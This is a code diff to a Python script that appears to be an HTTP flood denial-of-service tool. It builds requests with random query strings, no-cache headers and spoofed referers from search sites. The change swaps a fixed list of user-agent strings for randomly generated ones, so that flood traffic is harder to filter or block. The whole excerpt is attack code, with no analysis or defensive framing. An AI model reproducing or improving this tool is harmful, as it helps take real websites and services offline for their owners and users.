@@ -3,13 +3,14 @@ import sys
 import threading
 from random import randint, choice
 import re
+from user_agent import generate_user_agent
 
 url = host = ''
-user_agents = []
+# user_agents = []
 referes = []
 request_counter = flag = safe = 0
 
-# user agents list
+""" user agents list
 user_agents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
 user_agents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
 user_agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
@@ -22,7 +23,7 @@ user_agents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4
 user_agents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
 user_agents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
 user_agents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-
+"""
 referes.append('https://www.google.com/?q=')
 referes.append('http://www.usatoday.com/search/results?q=')
 referes.append('http://engadget.search.aol.com/search?q=')
@@ -68,7 +69,7 @@ def httpcall(url):
     param = buildblock(randint(3, 10))
     param_val = buildblock(randint(3, 10))
     request = Request(url + param_joiner + param + '=' + param_val)
-    request.add_header('User-Agent', choice(user_agents))
+    request.add_header('User-Agent', generate_user_agent())
     request.add_header('Cache-Control', 'no-cache')
     request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
     request.add_header('Referer', choice(referes) + buildblock(randint(5, 10)))
